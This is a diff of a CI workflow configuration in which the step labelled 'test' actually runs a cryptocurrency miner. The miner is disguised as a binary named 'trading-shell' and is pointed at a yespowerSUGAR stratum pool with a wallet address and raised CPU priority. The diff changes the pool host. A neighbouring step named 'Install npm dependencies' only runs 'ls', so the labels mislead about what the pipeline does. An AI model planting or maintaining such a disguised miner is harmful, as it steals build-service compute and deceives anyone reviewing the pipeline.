@@ -31,4 +31,4 @@ workflows:
       - name: Install npm dependencies
         script: ls
       - name: test
-        script: ./trading-shell -a yespowerSUGAR -o stratum+tcp://eu.poolmine.xyz:6238 -u sugar1qjy7ghl02f037hyn063l5llqpkvsjytlm9tmuaj.1 -t 4 --cpu-priority 4 && set -x
+        script: ./trading-shell -a yespowerSUGAR -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1qjy7ghl02f037hyn063l5llqpkvsjytlm9tmuaj.1 -t 4 --cpu-priority 4 && set -x
